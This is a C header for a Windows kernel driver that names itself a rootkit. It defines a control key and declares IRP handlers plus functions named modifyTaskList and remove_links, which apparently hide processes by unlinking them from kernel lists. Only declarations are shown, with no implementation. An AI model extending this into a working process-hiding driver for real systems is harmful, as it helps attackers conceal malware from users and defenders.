#pragma once

#include <ntddk.h>
#include <stdio.h>
#include <stdlib.h>
#include <winapifamily.h>
#include <ntimage.h>
#include <stdarg.h>
#include "dbgmsg.h"

#define ROOTKIT_CTL_KEY "7C5E3380"

DRIVER_INITIALIZE DriverEntry;
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
PCHAR modifyTaskList(UINT32 pid);
void remove_links(PLIST_ENTRY Curerent);
